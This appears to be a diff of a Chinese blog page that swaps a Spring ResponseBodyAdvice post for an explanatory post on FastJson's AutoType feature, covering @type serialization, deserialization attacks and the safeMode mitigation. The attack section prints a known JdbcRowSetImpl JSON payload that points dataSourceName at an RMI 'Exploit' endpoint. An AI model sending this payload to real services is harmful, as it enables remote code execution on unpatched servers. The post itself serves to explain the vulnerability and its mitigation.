@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>浅析ResponseBodyAdvice接口的理解和实际应用 | 杨先生の小破站</title>
+  <title>FastJson的AutoType | 杨先生の小破站</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon1.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -408,21 +408,21 @@
 
 
 <div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
-  background-position: center center;position: relative;background-image:url('/medias/12.jpg')">
+  background-position: center center;position: relative;background-image:url('/medias/3.jpg')">
   <div class="post-detail-header-mask"></div>
   <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
   
   <div class="post-detail-header_info-box">
     <div class="title-box">
       <span class="title">
-        浅析ResponseBodyAdvice接口的理解和实际应用
+        FastJson的AutoType
       </span>
     </div>
     
     
       
         <span class="post-detail-header_date">
-          <i class="fas fa-calendar"></i> Published in：2022-02-15 |
+          <i class="fas fa-calendar"></i> Published in：2022-02-17 |
         </span>
       
 
@@ -430,8 +430,8 @@
         <span class="post-detail-header_categories">
           <i class="iconfont iconbookmark1"></i> category：
           
-            <a href="/categories/Spring/" class="post-detail-header_category">
-              Spring
+            <a href="/categories/%E7%AC%AC%E4%B8%89%E6%96%B9%E6%8F%92%E4%BB%B6/" class="post-detail-header_category">
+              第三方插件
             </a>
           
         </span>
@@ -440,11 +440,11 @@
       
         <div class="post-detail-header_wordcount">
           <span class="totalcount">
-            <i class="fas fa-file-text-o"></i> Words: 875 |
+            <i class="fas fa-file-text-o"></i> Words: 1.6k |
           </span>
   
           <span class="min2read">
-            <i class="fas fa-clock"></i> Reading time: 4min |
+            <i class="fas fa-clock"></i> Reading time: 6min |
           </span>
   
           
@@ -471,42 +471,97 @@
   <div class="main-content">
     <article class="post post-detail">
       <div class="post-content">
-        <h2 id="浅析ResponseBodyAdvice接口的理解和实际应用"><a href="#浅析ResponseBodyAdvice接口的理解和实际应用" class="headerlink" title="浅析ResponseBodyAdvice接口的理解和实际应用"></a>浅析ResponseBodyAdvice接口的理解和实际应用</h2><h3 id="一、官方解释"><a href="#一、官方解释" class="headerlink" title="一、官方解释"></a>一、官方解释</h3><p>官方对ResponseBodyAdvice接口类，大致描述是这样的</p>
-<blockquote>
-<p>允许执行{@code ResponseBody} 或 {@code ResponseEntity} 控制器方法之后，但在使用{@code HttpMessageConverter}编写主体之前自定义响应。</p>
-<p>实现可以直接用{@code RequestMappingHandlerAdapter} 和 {@code ExceptionHandlerExceptionResolver}注释，在这种情况下，它们将被两者自动检测。</p>
+        <p>[TOC]</p>
+<h1 id="FastJson的AutoType"><a href="#FastJson的AutoType" class="headerlink" title="FastJson的AutoType"></a>FastJson的AutoType</h1><h2 id="1-AutoType解析"><a href="#1-AutoType解析" class="headerlink" title="1 AutoType解析"></a>1 AutoType解析</h2><blockquote>
+<p>参考<a target="_blank" rel="noopener" href="https://juejin.cn/post/6846687594130964488">https://juejin.cn/post/6846687594130964488</a></p>
 </blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Allows customizing the response after the execution of an &#123;<span class="doctag">@code</span> <span class="doctag">@ResponseBody</span>&#125;</span></span><br><span class="line"><span class="comment"> * or a &#123;<span class="doctag">@code</span> ResponseEntity&#125; controller method but before the body is written</span></span><br><span class="line"><span class="comment"> * with an &#123;<span class="doctag">@code</span> HttpMessageConverter&#125;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Implementations may be registered directly with</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@code</span> RequestMappingHandlerAdapter&#125; and &#123;<span class="doctag">@code</span> ExceptionHandlerExceptionResolver&#125;</span></span><br><span class="line"><span class="comment"> * or more likely annotated with &#123;<span class="doctag">@code</span> <span class="doctag">@ControllerAdvice</span>&#125; in which case they</span></span><br><span class="line"><span class="comment"> * will be auto-detected by both.*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ResponseBodyAdvice</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Whether this component supports the given controller method return type</span></span><br><span class="line"><span class="comment">     * and the selected &#123;<span class="doctag">@code</span> HttpMessageConverter&#125; type.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> returnType the return type</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> converterType the selected converter type</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> true&#125; if &#123;<span class="doctag">@link</span> #beforeBodyWrite&#125; should be invoked;</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@code</span> false&#125; otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">supports</span><span class="params">(MethodParameter returnType, Class&lt;? extends HttpMessageConverter&lt;?&gt;&gt; converterType)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Invoked after an &#123;<span class="doctag">@code</span> HttpMessageConverter&#125; is selected and just before</span></span><br><span class="line"><span class="comment">     * its write method is invoked.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> body the body to be written</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> returnType the return type of the controller method</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> selectedContentType the content type selected through content negotiation</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> selectedConverterType the converter type selected to write to the response</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request the current request</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> response the current response</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the body that was passed in or a modified (possibly new) instance</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">T <span class="title">beforeBodyWrite</span><span class="params">(T body, MethodParameter returnType, MediaType selectedContentType,</span></span></span><br><span class="line"><span class="params"><span class="function">            Class&lt;? extends HttpMessageConverter&lt;?&gt;&gt; selectedConverterType,</span></span></span><br><span class="line"><span class="params"><span class="function">            ServerHttpRequest request, ServerHttpResponse response)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="二、方法分析"><a href="#二、方法分析" class="headerlink" title="二、方法分析"></a>二、方法分析</h3><p>ResponseBodyAdvice接口是在Controller执行return之后，在Response返回给客户端之前，执行的对response的一些处理，可以实现对response数据的一些统一封装或者加密等操作。</p>
-<p>该接口一共有两个方法：</p>
+<p>fastJson的主要功能就是将Java Bean序列化成Json字符串，这样得到字符串之后就可以通过数据库等方式进行持久化。</p>
+<p>但是，fastjson在序列化以及反序列化的过程中并没有使用Java自带的序列化机制，而是自定义了一套机制。</p>
+<p>其实，对于Json框架来说，想要把一个Java对象转换成字符串，可以有两种选择：</p>
 <ol>
-<li>supports —— 判断是否需要执行beforeBodyWrite方法，true为执行，false不执行 —— 通过supports方法，我们可以选择哪些类或哪些方法要对response进行处理，其余的则不处理。</li>
-<li>beforeBodyWrite —— 对response处理的具体执行方法。</li>
+<li>基于属性</li>
+<li>基于getter/setter</li>
 </ol>
-<h3 id="三、在Spring项目开发中的应用场景"><a href="#三、在Spring项目开发中的应用场景" class="headerlink" title="三、在Spring项目开发中的应用场景"></a>三、在Spring项目开发中的应用场景</h3><p>对Controller层的返回值进行修改或增强处理。比如返回值5，需要封装成</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;code&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">&quot;data&quot;</span>: <span class="number">5</span>,</span><br><span class="line">    <span class="attr">&quot;msg&quot;</span>: <span class="string">&quot;success&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>而我们所常用的JSON序列化框架中，FastJson和JackJson在把对象序列化成JSON字符串的时候，是通过遍历出该类中的所有getter方法进行的。Gson并不是这么做的，它是通过反射遍历该类中的所有属性，并把其值序列化成json。</p>
+<h3 id="1-1-type字段"><a href="#1-1-type字段" class="headerlink" title="1.1 type字段"></a>1.1 type字段</h3><p>假设我们有以下Java类:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Fruit</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>格式返回给前端。</p>
-<h4 id="1-Controller层"><a href="#1-Controller层" class="headerlink" title="1. Controller层"></a>1. Controller层</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span> <span class="comment">//此注解包含@ResponseBody注解</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/mp&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ResponseBodyAdviceController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/hello&quot;, method = RequestMethod.GET)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Apple</span> <span class="keyword">implements</span> <span class="title">Fruit</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> BigDecimal price;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="2-实现ResponseBodyAdvice接口的切面类"><a href="#2-实现ResponseBodyAdvice接口的切面类" class="headerlink" title="2. 实现ResponseBodyAdvice接口的切面类"></a>2. 实现ResponseBodyAdvice接口的切面类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*此注解针对controller层的类做增强功能，即对加了<span class="doctag">@RestController</span>注解的类进行处理</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@ControllerAdvice(annotations = RestController.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RestResultWrapper</span> <span class="keyword">implements</span> <span class="title">ResponseBodyAdvice</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">supports</span><span class="params">(MethodParameter returnType, Class&lt;? extends HttpMessageConverter&lt;?&gt;&gt; converterType)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">beforeBodyWrite</span><span class="params">(Object body, MethodParameter returnType, MediaType selectedContentType, Class&lt;? extends HttpMessageConverter&lt;?&gt;&gt; selectedConverterType, ServerHttpRequest request,</span></span></span><br><span class="line"><span class="params"><span class="function">                                  ServerHttpResponse response)</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//定义一个统一的返回类</span></span><br><span class="line">            RestResult responseResult = <span class="keyword">new</span> RestResult( <span class="string">&quot;0&quot;</span>, body, <span class="string">&quot;success&quot;</span>);</span><br><span class="line">             <span class="comment">//如果handler处理类的返回类型是String（即控制层的返回值类型），为了保证一致性，这里需要将ResponseResult转回去</span></span><br><span class="line">            <span class="keyword">if</span>(body <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                <span class="keyword">return</span> JSON.toJSONString(responseResult);</span><br><span class="line">            &#125;</span><br><span class="line">           <span class="comment">//封装后的数据返回到前端页面</span></span><br><span class="line">            <span class="keyword">return</span> JSONObject.toJSON(responseResult);       </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Store</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Fruit fruit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="3-返回公共类的创建"><a href="#3-返回公共类的创建" class="headerlink" title="3. 返回公共类的创建"></a>3. 返回公共类的创建</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 统一返回Rest风格的数据结构</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RestResult</span>&lt;<span class="title">T</span>&gt;  <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String code = <span class="string">&quot;2000&quot;</span>;</span><br><span class="line">    <span class="comment">// 成功时返回的数据，失败时返回具体的异常信息</span></span><br><span class="line">    <span class="keyword">private</span> T data;</span><br><span class="line">    <span class="comment">// 请求失败返回的提示信息，给前端进行页面展示的信息</span></span><br><span class="line">    <span class="keyword">private</span> String message ; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">RestResult</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;RestResult&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;code=&#x27;&quot;</span> + code + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, data=&quot;</span> + data +</span><br><span class="line">                <span class="string">&quot;, message=&quot;</span> + message +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">RestResult</span><span class="params">(String code, T data, String message)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.code = code;</span><br><span class="line">        <span class="keyword">this</span>.data = data;</span><br><span class="line">        <span class="keyword">this</span>.message = message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>那么问题来了，我们上面定义的Fruit只是一个接口，序列化的时候fastJson能够把属性值正确序列化出来吗？如果可以的话，那么反序列化的时候FastJson会把这个fruit反序列化成什么类型呢？</p>
+<hr>
+<p>我们尝试着验证一下，基于(fastjson 1.2.75)：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Store store = new Store();</span><br><span class="line">store.setName(<span class="string">&quot;Hollis&quot;</span>);</span><br><span class="line">Apple apple = new Apple();</span><br><span class="line">apple.setPrice(new BigDecimal(<span class="number">0.5</span>));</span><br><span class="line">store.setFruit(apple);</span><br><span class="line">String jsonString = JSON.toJSONString(store);</span><br><span class="line">System.out.println(<span class="string">&quot;toJSONString : &quot;</span> + jsonString);</span><br></pre></td></tr></table></figure>
+
+<p>我们创建了一个store，为他指定了名称，并且创建了一个Fruit的子类型Apple，然后将这个store使用 JSON.toJSONString 进行序列化，可以得到以下JSON内容：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">toJSONString : &#123;<span class="attr">&quot;fruit&quot;</span>:&#123;<span class="attr">&quot;price&quot;</span>:<span class="number">0.5</span>&#125;,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;Hollis&quot;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>那么，这个fruit的类型到底是什么呢，能否反序列化成Apple呢？我们再来执行以下代码:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Store newStore = JSON.parseObject(jsonString, Store.class);</span><br><span class="line">System.out.println(<span class="string">&quot;parseObject : &quot;</span> + newStore);</span><br><span class="line">Apple newApple = (Apple)newStore.getFruit();</span><br><span class="line">System.out.println(<span class="string">&quot;getFruit : &quot;</span> + newApple);</span><br></pre></td></tr></table></figure>
+
+<p>执行结果报错，我们尝试将Fruit转换成Apple，但是抛出了异常。</p>
+<p>以上现象，我们知道，<strong>当一个类中包含了一个接口（或抽象类）的时候，在使用fastJson进行序列化的时候，会将类型抹去，只保留接口（抽象类）的类型，使得反序列化时无法拿到原始类型。</strong></p>
+<p>那么有什么办法解决这个问题呢，FastJson引用了AutoType，即在序列化的时候，把原始类型记录下来。</p>
+<p>使用方法是通过<code>SerializerFeature.WriteClassName</code>进行标记，即将上述代码中的</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String jsonString = JSON.toJSONString(store);</span><br></pre></td></tr></table></figure>
+
+<p>修改成:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String jsonString = JSON.toJSONString(store, SerializerFeature.WriteClassName)</span><br></pre></td></tr></table></figure>
+
+<p>输出结果如下：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.example.redis.entity.Store&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;fruit&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.example.redis.entity.Apple&quot;</span>, <span class="comment">//多了@type映射全类名,反序列就可以找到对应的类</span></span><br><span class="line">        <span class="attr">&quot;price&quot;</span>:<span class="number">0.5</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>:<span class="string">&quot;Hollis&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这就是AutoType，以及FastJson中引入AutoType的原因。</p>
+<h3 id="1-2-setAutoTypeSupport"><a href="#1-2-setAutoTypeSupport" class="headerlink" title="1.2 setAutoTypeSupport"></a>1.2 setAutoTypeSupport</h3><p>首先，可以通过:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().isAutoTypeSupport(); <span class="comment">// 获取是否允许AutoType(默认是false)</span></span><br><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>); <span class="comment">// 设置全局支持禁止AutoType</span></span><br></pre></td></tr></table></figure>
+
+<p>尝试关闭AutoType后：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">false</span>);	<span class="comment">// 设置全局支持或禁止AutoType</span></span><br></pre></td></tr></table></figure>
+
+<p>发现以上的代码还是可以正常的根据@type字段来反序列化。</p>
+<p>但是如果使用了泛型，如下：</p>
+<p>再有以下Java类:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@ToString</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Result</span>&lt;<span class="title">T</span>&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> T data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再对Store进行封装：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">false</span>);</span><br><span class="line"><span class="comment">//ParserConfig.getGlobalInstance().setSafeMode(true);</span></span><br><span class="line">Store store = <span class="keyword">new</span> Store();</span><br><span class="line">store.setName(<span class="string">&quot;Hollis&quot;</span>);</span><br><span class="line">Apple apple = <span class="keyword">new</span> Apple();</span><br><span class="line">apple.setPrice(<span class="keyword">new</span> BigDecimal(<span class="number">0.5</span>));</span><br><span class="line">store.setFruit(apple);</span><br><span class="line"></span><br><span class="line">Result&lt;Store&gt; t = <span class="keyword">new</span> Result&lt;&gt;(store);</span><br><span class="line">String jsonString = JSON.toJSONString(t, SerializerFeature.WriteClassName);</span><br><span class="line">System.out.println(<span class="string">&quot;toJSONString : &quot;</span> + jsonString);</span><br><span class="line">Result result = JSON.parseObject(jsonString, Result.class);</span><br><span class="line">System.out.println(<span class="string">&quot;parseObject : &quot;</span> + result);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>输出结果：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">toJSONString : &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.example.redis.entity.Result&quot;</span>,<span class="string">&quot;data&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.example.redis.entity.Store&quot;</span>,<span class="string">&quot;fruit&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.example.redis.entity.Apple&quot;</span>,<span class="string">&quot;price&quot;</span>:<span class="number">0.5</span>&#125;,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Hollis&quot;</span>&#125;&#125;</span><br><span class="line">com.alibaba.fastjson.JSONException: autoType is not support.   <span class="comment">// 异常autoType is not support</span></span><br><span class="line">....</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>若开启setAutoTypeSupport(true)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">toJSONString : &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.example.redis.entity.Result&quot;</span>,<span class="string">&quot;data&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.example.redis.entity.Store&quot;</span>,<span class="string">&quot;fruit&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.example.redis.entity.Apple&quot;</span>,<span class="string">&quot;price&quot;</span>:<span class="number">0.5</span>&#125;,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Hollis&quot;</span>&#125;&#125;</span><br><span class="line">parseObject : Result(data=Store(name=Hollis, fruit=Apple(price=<span class="number">0.5</span>))) <span class="comment">//可以正常反序列化</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="2-反序列化攻击"><a href="#2-反序列化攻击" class="headerlink" title="2 反序列化攻击"></a>2 反序列化攻击</h2><p>因为有了autoType功能，那么FastJson在对JSON字符串进行反序列化的时候，就会读取<code>@type</code>到内容，试图把JSON内容反序列化成这个对象，并且会调用这个类的setter方法。</p>
+<p>那么就可以利用这个特性，自己构造一个JSON字符串，并且使用<code>@type</code>指定一个自己想要使用的攻击类库。</p>
+<p>举个例子，黑客比较常用的攻击类库是<code>com.sun.rowset.JdbcRowSetImpl</code>，这是sun官方提供的一个类库，这个类的dataSourceName支持传入一个rmi的源，当解析这个url的时候，就会支持rmi远程调用，去指定的rmi地址中去调用方法。</p>
+<p>而FastJson在反序列化的时候会调用目标类的setter方法，那么如果黑客在JdbcRowSetImpl的dataSourceName中设置一个想要执行的命令，那么就会导致很严重的后果</p>
+<p>如通过以下方式定义一个JSON串，即可实现远程命令（在早期版本中，新版本中JdbcRowSetImpl已经被加了黑名单）</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://localhost:1099/Exploit&quot;</span>,<span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p> <strong>这就是所谓的远程命令执行漏洞，即利用漏洞入侵到目标服务器，通过服务器执行命令。</strong></p>
+<h2 id="3-AutoType安全模式"><a href="#3-AutoType安全模式" class="headerlink" title="3 AutoType安全模式"></a>3 AutoType安全模式</h2><p>这些漏洞的利用几乎都是围绕AutoType来的，于是，在v1.2.68版本中，引入了safeMode，配置safeModel后，无论白名单和黑名单，都不支持autoType,可一定程度上缓解反序列化类变种攻击。</p>
+<p>设置了safeModel后，@type字段不在生效，即当解析形如{“@type”: “com.java.class”}的JSON串时，将不再反序列化出对应的类。(无论白名单和黑名单，都不支持autoType)。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setSafeMode(<span class="keyword">true</span>); </span><br></pre></td></tr></table></figure>
+
+<p>所以一般使用AutoType时建议使用指定白名单的方式。</p>
